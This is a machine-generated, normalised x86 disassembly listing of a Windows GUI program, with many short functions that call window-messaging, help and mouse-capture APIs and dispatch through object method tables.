pop ebx
retn
sub_442664
push esi
mov esi eax
mov eax esi
call sub_44e48c
mov eax esi
mov si 0xffc7
call sub_4034a4
pop esi
retn
sub_442709
jmp sub_403a3c
sub_442710
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_442718
push ebx
mov ebx eax
mov eax ebx
call sub_44e5f0
cmp [ ebx + 0x182 ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x184 ]
call [ ebx + 0x180 ]
sub_44273c
push ebx
mov ebx eax
mov eax ebx
call sub_44e608
cmp [ ebx + 0x17a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x17c ]
call [ ebx + 0x178 ]
sub_442828
cmp dl [ eax + 0x20f ]
je r-xdata
retn
mov [ eax + 0x20f ] dl
call sub_442e50
sub_44283c
push ebx
mov ebx eax
cmp dl [ ebx + 0x20c ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x20c ] dl
mov eax ebx
call sub_442e50
mov eax ebx
call sub_450658
sub_442860
cmp dl [ eax + 0x213 ]
je r-xdata
retn
mov [ eax + 0x213 ] dl
call sub_450658
sub_442874
cmp dl [ eax + 0x211 ]
je r-xdata
retn
mov [ eax + 0x211 ] dl
call sub_450658
sub_4428b8
cmp dl [ eax + 0x212 ]
je r-xdata
retn
mov [ eax + 0x212 ] dl
call sub_450658
sub_4429b9
jmp sub_403a3c
sub_4429c0
pop ebx
pop ecx
pop ebp
retn
sub_442ad8
push ebx
mov ebx eax
push r-xdata
mov eax ebx
call sub_4530b8
push eax
call SetWindowTextA
pop ebx
retn
sub_442af4
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x301
mov eax ebx
call sub_4530b8
push eax
call SendMessageA
pop ebx
retn
sub_442b10
push ebx
mov ebx eax
push 0xffffffff
push 0x0
push 0xb1
mov eax ebx
call sub_4530b8
push eax
call SendMessageA
pop ebx
retn
sub_442bb6
jmp sub_403a3c
sub_442bbd
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_442c56
jmp sub_403a3c
sub_442dcf
jmp sub_403a3c
sub_442e34
push ebx
mov ebx eax
mov eax ebx
call sub_4428cc
mov [ ebx + 0x215 ] al
mov eax ebx
call sub_450454
pop ebx
retn
sub_442f34
push ebx
mov ebx eax
mov eax ebx
call sub_44c480
cmp [ ebx + 0x21a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x21c ]
call [ ebx + 0x218 ]
sub_44302c
push esi
cmp [ edx + 0x6 ] 0x300
jne r-xdata
pop esi
retn
cmp [ eax + 0x214 ] 0x0
jne r-xdata
mov si 0xffb3
call sub_4034a4
sub_4430dc
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x146
mov eax [ ebx + 0x10 ]
call sub_4530b8
push eax
call SendMessageA
pop ebx
retn
sub_44315e
jmp sub_403a3c
sub_443165
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_443250
jmp sub_403a3c
sub_443257
pop ebx
pop ecx
pop ebp
retn
sub_44334b
jmp sub_403a3c
sub_443352
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4433cf
jmp sub_403a3c
sub_4433d6
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44352c
push ebx
mov ebx eax
mov edx r-xdata
mov eax ebx
call sub_44c850
mov eax [ ebx + 0x23c ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov [ ebx + 0x260 ] 0xffffffff
pop ebx
retn
sub_44357c
push ebx
mov ebx eax
push 0xffff0000
push 0x0
push 0x142
mov eax ebx
call sub_4530b8
push eax
call SendMessageA
pop ebx
retn
sub_4436b0
test edx edx
jle r-xdata
retn
mov [ eax + 0x238 ] edx
call sub_450658
sub_4436e4
mov ecx [ eax ]
call [ ecx - 0x10 ]
retn
sub_4436ec
mov ecx [ eax ]
call [ ecx - 0x10 ]
retn
sub_4436f4
mov ecx [ eax ]
call [ ecx - 0x10 ]
retn
sub_443720
cmp eax [ edx + 0x8 ]
je r-xdata
retn
push 0x0
xor ecx ecx
mov edx 0x14f
call sub_44da78
sub_443878
push ebx
push esi
mov esi eax
mov eax [ esi + 0x258 ]
push eax
mov ecx [ esi + 0x244 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0xf4 ]
pop esi
pop ebx
retn
sub_443898
cmp dl [ eax + 0x274 ]
je r-xdata
retn
mov [ eax + 0x274 ] dl
call sub_450658
sub_443b63
jmp sub_403788
sub_443df4
jmp sub_403a3c
sub_443dfb
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_443e04
push ebx
mov ebx eax
mov eax ebx
call sub_44c480
cmp [ ebx + 0x21a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x21c ]
call [ ebx + 0x218 ]
sub_443ed1
jmp sub_403a3c
sub_443ed8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_443ee4
push ebx
cmp [ eax + 0x22a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x22c ]
call [ ebx + 0x228 ]
sub_443f60
push ebx
cmp [ eax + 0x232 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x234 ]
call [ ebx + 0x230 ]
sub_44407a
jmp sub_403a3c
sub_4440c4
or edx 0xffffffff
mov ecx [ eax ]
call [ ecx + 0xd0 ]
retn
sub_44414f
jmp sub_403a3c
sub_444156
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_444188
mov edx [ eax ]
call [ edx + 0x104 ]
retn
sub_444194
mov [ eax + 0x210 ] edx
retn
sub_4441e5
jmp sub_403a3c
sub_4441ec
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4442b4
cmp dl [ eax + 0x275 ]
je r-xdata
retn
mov [ eax + 0x275 ] dl
call sub_450658
sub_444308
mov dl [ eax + 0x276 ]
add dl 0xfd
sub dl 0x2
jae sub_44431d
mov eax [ eax + 0x238 ]
retn
sub_44431d
push 0x0
xor ecx ecx
mov edx 0x154
call sub_44da78
retn
sub_44465c
jmp sub_403a3c
sub_444663
pop ebx
mov esp ebp
pop ebp
retn
sub_444a20
jmp sub_403a3c
sub_444a27
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_444be5
jmp sub_403a3c
sub_444bec
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_444bf8
push ebx
cmp [ eax + 0x28a ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x28c ]
call [ ebx + 0x288 ]
sub_444ddc
mov eax [ eax + 0x23c ]
mov edx [ eax ]
call [ edx + 0x14 ]
retn
sub_444de8
mov eax [ r-xdata ]
retn
sub_445019
jmp sub_403a3c
sub_445028
retn
sub_4450de
jmp sub_403a3c
sub_445188
mov eax [ r-xdata ]
retn
sub_445190
xor eax eax
retn
sub_4451b4
retn
sub_4452cc
cmp dl [ eax + 0x209 ]
je r-xdata
retn
mov [ eax + 0x209 ] dl
call sub_450658
sub_445344
push ebx
mov ebx eax
mov eax ebx
call sub_464294
test eax eax
je r-xdata
mov eax ebx
call sub_44de00
pop ebx
retn
mov edx [ ebx + 0x214 ]
mov [ eax + 0x24c ] edx
sub_445368
xor eax eax
retn
sub_44542f
add [ ebx - 0x75 ] dl
fmul [ ebx - 0x53c9173d ]
add [ eax ] al
mov al [ ebx + 0x210 ]
mov [ ebx + 0x212 ] al
pop ebx
retn
sub_445448
push esi
cmp [ edx + 0x6 ] 0x0
jne r-xdata
pop esi
retn
mov si 0xffeb
call sub_4034a4
sub_445539
lea eax [ ebp - 0x4 ]
call sub_404038
retn
sub_445542
jmp sub_403a3c
j_sub_445539
jmp sub_445539
sub_445549
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44567c
mov al [ eax + 0x211 ]
retn
sub_4456b0
cmp dl [ eax + 0x210 ]
je r-xdata
retn
mov [ eax + 0x210 ] dl
call sub_450658
sub_445890
call sub_450658
retn
sub_44590d
jmp sub_403a3c
sub_445914
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_445cd7
jmp sub_403a3c
sub_445cde
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_445ce8
mov ecx [ eax + 0x214 ]
push ecx
mov ecx [ eax + 0x210 ]
call sub_445ba0
retn
sub_445d54
mov ecx [ eax + 0x214 ]
push ecx
mov ecx edx
mov edx [ eax + 0x20c ]
call sub_445ba0
retn
sub_445d6c
push edx
mov ecx [ eax + 0x210 ]
mov edx [ eax + 0x20c ]
call sub_445ba0
retn
sub_445d80
push ebx
mov ebx eax
mov eax ebx
call sub_44c480
cmp [ ebx + 0x22a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x22c ]
call [ ebx + 0x228 ]
sub_445da4
push ebx
cmp [ eax + 0x232 ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x234 ]
call [ ebx + 0x230 ]
sub_445edc
call sub_445dc4
retn
sub_445ee4
call sub_445dc4
retn
sub_445f14
mov ecx [ eax ]
call [ ecx - 0x10 ]
retn
sub_445f41
jmp sub_403a3c
sub_445f48
pop ebp
retn
sub_445f4c
sub [ rw-data ] 0x1
retn
sub_446160
push ebx
mov ebx edx
mov eax ebx
mov edx [ r-xdata ]
call sub_403458
pop ebx
retn
sub_446295
jmp sub_403a3c
sub_44629c
pop ebp
retn
sub_4462a0
sub [ rw-data ] 0x1
retn
sub_4462b9
add eax 0xffffffe0
jmp sub_4468a0
sub_4462c1
add eax 0xffffffe0
jmp sub_446908
sub_4462c9
add eax 0xffffffe0
jmp sub_446a1c
sub_4462d1
add eax 0xffffffe0
jmp sub_446a90
sub_4462d9
add eax 0xffffffe0
jmp sub_44654c
sub_4462e1
add eax 0xffffffe0
jmp sub_446560
sub_4462e9
add eax 0xffffffe0
jmp sub_4465d8
sub_4462f1
add eax 0xffffffe0
jmp sub_44667c
sub_4462f9
add eax 0xffffffe0
jmp sub_446680
sub_446301
add eax 0xffffffe0
jmp sub_446708
sub_446309
add eax 0xffffffe0
jmp sub_446850
sub_446311
add eax 0xffffffe0
jmp sub_446854
sub_446319
add eax 0xffffffe0
jmp sub_446870
sub_44632b
add [ esp + 0x4 ] 0xffffffe0
jmp sub_405a08
sub_446335
add [ esp + 0x4 ] 0xffffffe0
jmp sub_405a1c
sub_446509
jmp sub_403a3c
sub_446510
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44654c
push ebx
mov ebx edx
mov eax ebx
mov edx [ rw-data ]
call sub_40408c
pop ebx
retn
sub_4465c7
jmp sub_403a3c
sub_4465ce
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_446660
jmp sub_403a3c
sub_446667
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44667c
mov al 0x1
retn
sub_4466fb
jmp sub_403a3c
sub_446702
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_446800
jmp sub_403a3c
sub_446807
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_446850
mov [ eax + 0xc ] edx
retn
sub_446854
mov [ eax + 0x10 ] 0x3
push 0x0
push 0x2
push r-xdata
push 0x0
call WinHelpA
retn
sub_4468f8
jmp sub_403a3c
sub_4468ff
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4469fe
jmp sub_403a3c
sub_446a05
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_446a7e
jmp sub_403a3c
sub_446a85
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_446b10
jmp sub_403a3c
sub_446b17
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_446c0b
jmp sub_403a3c
sub_446c12
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_446cd4
mov [ eax + 0xc ] 0x0
mov [ eax + 0xd ] 0x0
xor edx edx
mov [ eax + 0x4 ] edx
push eax
push sub_446c20
call EnumWindows
retn
sub_446d66
jmp sub_403a3c
sub_446d6d
mov al [ ebp - 0x5 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_446d78
xor eax eax
retn
sub_446e71
jmp sub_403a3c
sub_446e78
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_446f62
jmp sub_403a3c
sub_446f69
pop ebp
retn
sub_446fbe
jmp sub_403a3c
sub_446fc5
pop ebp
retn
sub_44811c
pushad
retn 0x44
sub_4481c8
jmp r-xdata
sub_4481ca
0xe8ffe9ff 0xe7ff
sub_4481d1
jmp esi
sub_448bdc
pushad
retn 0x44
sub_449289
add eax 0xffffff8c
jmp sub_455744
sub_449291
add eax 0xffffff8c
jmp sub_455748
sub_449299
add eax 0xffffff8c
jmp sub_455834
sub_4492a1
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x8 ]
xchg [ esp ] eax
retn
sub_4492ae
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0xc ]
xchg [ esp ] eax
retn
sub_4492bb
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x28 ]
xchg [ esp ] eax
retn
sub_4492c8
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x14 ]
xchg [ esp ] eax
retn
sub_4492d5
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x18 ]
xchg [ esp ] eax
retn
sub_4492e2
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x20 ]
xchg [ esp ] eax
retn
sub_4492ef
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x1c ]
xchg [ esp ] eax
retn
sub_4492fc
add eax 0xffffff8c
jmp sub_456ea4
sub_44930e
add [ esp + 0x4 ] 0xffffff8c
jmp sub_405a08
sub_449318
add [ esp + 0x4 ] 0xffffff8c
jmp sub_405a1c
sub_4495d4
mov dl [ eax ]
sub dl 0x1
jb r-xdata
mov [ eax ] 0x1
retn
je r-xdata
mov [ eax ] 0x0
jmp r-xdata
retn
sub_4498e7
inc [ esi ]
add [ eax ] al
add [ ebx + 0x72 ] ah
push ebx
imul edi [ edx + 0x65 ] 0x156a0000
mov ecx rw-data
call sub_4181f8
retn
sub_449904
push 0x15
mov ecx rw-data
call sub_4181b8
retn
sub_4499f0
call GetCapture
call sub_4496d4
test eax eax
je r-xdata
retn
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ rw-data ]
cmp eax [ edx + 0x30 ]
jne r-xdata
mov eax [ rw-data ]
sub_449c54
push ebx
push eax
push sub_449dd8
call sub_4220a8
mov ebx eax
push ebx
call SetCapture
mov eax ebx
pop ebx
retn
sub_449c6c
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_449c9c
push ebx
mov ebx edx
call ReleaseCapture
mov eax ebx
call sub_42215c
pop ebx
retn
sub_449d7a
jmp sub_403788
sub_449dac
xor eax eax
retn
sub_449db0
push ebp
mov ebp esp
test dl dl
je r-xdata
mov ax 0xfff3
mov ax 0xfff4
jmp r-xdata
pop ebp
retn 0x4
sub_449dc8
retn
sub_449dcc
mov eax [ rw-data ]
retn
sub_449dd4
retn
sub_449e02
jmp sub_403788
sub_449e07
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_46d0dc
call sub_403af0
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_449e24
call sub_403500
xor eax eax
mov [ rw-data ] eax
retn
sub_449e34
call sub_4034fc
xor eax eax
mov [ rw-data ] eax
retn
sub_449e44
retn
sub_449e48
test dl dl
je r-xdata
mov [ eax + 0x38 ] ecx
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_40360c
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_449ef8
push ebp
mov ebp esp
test dl dl
je r-xdata
mov ax 0xfff3
mov eax [ eax + 0x38 ]
mov ax [ eax + 0x7a ]
jmp r-xdata
pop ebp
retn 0x4
sub_449f10
mov eax [ eax + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
retn
sub_449f5c
retn
sub_44a114
push esi
mov esi eax
mov edx esi
mov eax [ esi + 0x38 ]
mov si 0xffdb
call sub_4034a4
pop esi
retn
sub_44a128
push esi
mov esi eax
mov edx esi
mov eax [ esi + 0x38 ]
mov si 0xffda
call sub_4034a4
pop esi
retn
sub_44a13c
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x4
sub_44a148
mov eax 0x4
retn
sub_44a150
retn
sub_44ad41
jmp sub_403788
sub_44b02e
jmp sub_403a3c
sub_44b0a0
jmp sub_403a3c
sub_44b0ac
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ rw-data ] eax
retn
xor eax eax
call sub_44add4
sub_44b22b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_425444
retn
sub_44b241
jmp sub_403a3c
sub_44b268
jmp sub_403a3c
sub_44b2ea
jmp sub_403a3c
sub_44b312
jmp sub_403a3c
sub_44b319
mov esp ebp
pop ebp
retn
sub_44b3d1
jmp sub_403a3c
sub_44b428
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x58 ]
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_44b3f4
mov [ ebx + 0x58 ] esi
sub_44b57c
push ebx
cmp [ eax + 0x1a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
sub_44b590
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_403458
mov [ ebx + 0x18 ] eax
pop esi
pop ebx
retn
sub_44b679
jmp sub_403a3c
sub_44b680
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44b703
jmp sub_403a3c
sub_44b70a
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_44bad8
xor eax eax
retn
sub_44badc
mov al [ eax + 0x58 ]
retn
sub_44bae0
xor eax eax
retn
sub_44bae4
cmp [ eax + 0x30 ] 0x0
setne al
retn
sub_44baec
mov eax [ eax + 0x30 ]
retn
sub_44bb90
mov edx [ eax + 0x6c ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x10 ]
retn
sub_44bc3c
push ebx
mov ebx eax
xor eax eax
mov al [ ebx + 0x5b ]
mov al [ eax + rw-data ]
cmp al [ ebx + 0x61 ]
setne al
pop ebx
retn
sub_44bc54
mov [ eax + 0x5d ] dl
retn
sub_44bc58
mov edx [ eax + 0x30 ]
test edx edx
je r-xdata
retn
xchg edx eax
call sub_44f8bc
sub_44bc68
push ebx
cmp [ eax + 0xfa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0xfc ]
call [ ebx + 0xf8 ]
sub_44c14b
jmp sub_403a3c
sub_44c152
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44c1b4
test [ eax + 0x1c ] 0x1
jne r-xdata
mov [ eax + 0x158 ] edx
retn
mov [ eax + 0x150 ] 0x1
sub_44c260
xor ecx ecx
mov [ edx ] ecx
xor ecx ecx
mov [ edx + 0x4 ] ecx
mov ecx [ eax + 0x48 ]
mov [ edx + 0x8 ] ecx
mov eax [ eax + 0x4c ]
mov [ edx + 0xc ] eax
retn
sub_44c37d
jmp sub_403a3c
sub_44c384
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44c480
push eax
xor ecx ecx
mov edx 0xb037
call sub_44da78
retn
sub_44c641
add [ eax ] al
add [ esi + 0x3a ] dl
push eax
pop esp
je r-xdata
pop esi
retn
mov [ eax + 0x5c ] dl
test dl dl
je r-xdata
mov si 0xffee
call sub_4034a4
sub_44c6f2
jmp sub_403a3c
sub_44c6f9
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44c7d0
cmp dl [ eax + 0x58 ]
je r-xdata
retn
mov [ eax + 0x58 ] dl
push 0x0
xor ecx ecx
mov edx 0xb00c
call sub_44da78
sub_44c7e8
push 0x0
xor ecx ecx
mov edx 0xe
call sub_44da78
retn
sub_44c7f8
push edx
mov edx 0xd
call sub_44da78
retn
sub_44c804
mov edx [ eax + 0xac ]
test edx edx
jle r-xdata
mov eax [ eax + 0x4c ]
retn
mov eax edx
retn
sub_44c818
mov edx [ eax + 0xa8 ]
test edx edx
jle r-xdata
mov eax [ eax + 0x48 ]
retn
mov eax edx
retn
sub_44c8f9
jmp sub_403a3c
sub_44c900
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44c908
cmp dl [ eax + 0x5f ]
je r-xdata
retn
mov [ eax + 0x5f ] dl
mov [ eax + 0x60 ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb03c
call sub_44da78
sub_44c978
cmp [ eax + 0x59 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x56 ] 0x0
je r-xdata
mov al 0x1
retn
sub_44c98c
mov al [ eax + 0x9a ]
xor al 0x1
retn
sub_44c998
mov al [ eax + 0x60 ]
xor al 0x1
retn
sub_44c9a0
cmp dl [ eax + 0x59 ]
je r-xdata
retn
mov [ eax + 0x59 ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb008
call sub_44da78
sub_44c9c4
cmp dl [ eax + 0x99 ]
je r-xdata
retn
mov [ eax + 0x99 ] dl
mov [ eax + 0x9a ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb022
call sub_44da78
sub_44c9e8
cmp dl [ eax + 0x9a ]
je r-xdata
retn
mov [ eax + 0x9a ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb023
call sub_44da78
sub_44ca30
mov al [ eax + 0x5a ]
xor al 0x1
retn
sub_44ca5c
cmp dl [ eax + 0x60 ]
je r-xdata
retn
mov [ eax + 0x60 ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
call sub_44da78
sub_44ca80
cmp dx [ eax + 0x78 ]
je r-xdata
retn
mov [ eax + 0x78 ] dx
push 0x0
xor ecx ecx
mov edx 0xb00f
call sub_44da78
sub_44ca9c
push ebx
mov ebx eax
call sub_4499f0
cmp ebx eax
sete al
pop ebx
retn
sub_44cad4
push esi
mov dl 0x1
mov si 0xffce
call sub_4034a4
pop esi
retn
sub_44cc1e
jmp sub_403a3c
sub_44cc25
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44cd48
test [ eax + 0x50 ] 0x40
setne cl
mov dl [ eax + 0x57 ]
call sub_44ccbc
retn
sub_44cd9c
xor edx edx
call sub_44c794
retn
sub_44cdd4
push esi
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
pop esi
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x88 ]
sub_44cde8
mov edx [ eax ]
call [ edx + 0x80 ]
retn
sub_44cecd
jmp sub_403a3c
sub_44ceec
xor eax eax
retn
sub_44cef0
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x5f ] 0x0
jne r-xdata
mov al 0x1
retn
sub_44cf08
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x5f ] 0x0
jne r-xdata
mov al 0x1
retn
sub_44cf20
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x5f ] 0x1
je r-xdata
mov al 0x1
retn
sub_44cf38
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
mov al [ eax + 0x5f ]
dec eax
sub al 0x2
jb r-xdata
mov al 0x1
retn
sub_44cf54
mov edx [ rw-data ]
mov ecx [ edx + 0x8 ]
mov edx [ rw-data ]
mov dl [ edx + 0x4 ]
call sub_44cf6c
retn
sub_44d030
retn
sub_44d034
cmp eax [ rw-data ]
sete al
retn
sub_44d0a8
push ebx
cmp [ eax + 0x112 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x114 ]
call [ ebx + 0x110 ]
sub_44d1c4
push ebp
mov ebp esp
push esi
mov si 0xffd2
call sub_4034a4
pop esi
pop ebp
retn 0x4
sub_44d204
push ebx
cmp [ eax + 0x102 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x104 ]
call [ ebx + 0x100 ]
sub_44d49b
jmp sub_403a3c
sub_44d4a2
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44d4ac
push esi
mov esi eax
xor ecx ecx
mov eax esi
mov si 0xffe8
call sub_4034a4
pop esi
retn
sub_44d4c0
push esi
mov esi eax
mov cl 0x1
mov eax esi
mov si 0xffe8
call sub_4034a4
pop esi
retn
sub_44d78f
jmp sub_403a3c
sub_44d838
push esi
mov si 0xffee
call sub_4034a4
pop esi
retn
sub_44d844
mov al 0x1
retn
sub_44db1c
mov ecx [ edx ]
mov [ eax + 0x40 ] ecx
mov ecx [ edx + 0x4 ]
mov [ eax + 0x44 ] ecx
mov ecx [ edx + 0x8 ]
sub ecx [ edx ]
mov [ eax + 0x48 ] ecx
mov ecx [ edx + 0xc ]
sub ecx [ edx + 0x4 ]
mov [ eax + 0x4c ] ecx
call sub_44bea0
retn
sub_44db40
retn
sub_44dd59
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov eax esi
call sub_41c6d8
mov [ ebx + 0x5e ] al
pop esi
pop ebx
retn
sub_44dd74
mov al [ eax + 0x5e ]
xchg edx eax
call sub_41eb90
retn
sub_44de6c
push ebx
cmp [ eax + 0x12a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x12c ]
call [ ebx + 0x128 ]
sub_44e484
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_44e48c
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_44e494
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_44e54c
push esi
mov esi eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop esi
retn
cmp [ edx + 0x4 ] 0x0
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_44e56c
push ebx
mov ebx eax
cmp [ ebx + 0x9a ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x30 ]
mov dl [ eax + 0x99 ]
mov eax ebx
call sub_44c9c4
mov [ ebx + 0x9a ] 0x1
sub_44e5c4
push ebx
mov ebx eax
cmp [ ebx + 0x56 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x84 ]
mov eax ebx
call sub_44c968
mov [ ebx + 0x56 ] 0x1
sub_44e5e8
mov [ edx + 0xc ] 0x1
retn
sub_44e5f0
mov edx [ eax + 0x30 ]
test edx edx
je r-xdata
retn
push eax
xor ecx ecx
mov eax edx
mov edx 0xb013
call sub_44da78
sub_44e608
mov edx [ eax + 0x30 ]
test edx edx
je r-xdata
retn
push eax
xor ecx ecx
mov eax edx
mov edx 0xb014
call sub_44da78
sub_44e620
xor eax eax
mov [ edx + 0xc ] eax
retn
sub_44e886
jmp sub_403a3c
sub_44e88d
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44e8b8
mov eax [ r-xdata ]
retn
sub_44ea54
jmp sub_403a3c
sub_44ea5b
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44eb7c
mov eax [ eax + 0xb8 ]
retn
sub_44ebe4
push ebx
mov ebx eax
mov eax ebx
call sub_44cf08
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax 0x20000
pop ebx
retn
sub_44ec00
mov edx [ eax + 0x6c ]
test edx edx
je r-xdata
retn
mov eax edx
mov edx [ eax ]
call [ edx + 0x1c ]
sub_44ed98
mov eax [ eax + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_44edc8
mov edx [ eax ]
call [ edx + 0x34 ]
retn
sub_44edd0
call sub_44b90c
retn
sub_44eed0
jmp sub_403a3c
sub_44eefc
cmp [ eax + 0x160 ] 0x0
seta al
retn
sub_44f09c
jmp sub_403a3c
sub_44f0ec
jmp sub_403a3c
sub_44f124
retn
sub_44f3ad
jmp sub_403a3c
sub_44f535
jmp sub_403a3c
sub_44f897
jmp sub_403a3c
sub_44f943
jmp sub_403a3c
sub_44f950
inc [ eax + 0x160 ]
retn
sub_44f958
dec [ eax + 0x160 ]
cmp [ eax + 0x160 ] 0x0
jne r-xdata
retn
test [ eax + 0x54 ] 0x10
je r-xdata
call sub_44f978
sub_44f978
xor edx edx
call sub_44f8bc
retn
sub_44fa45
jmp sub_403a3c
sub_44fa4c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44fb3b
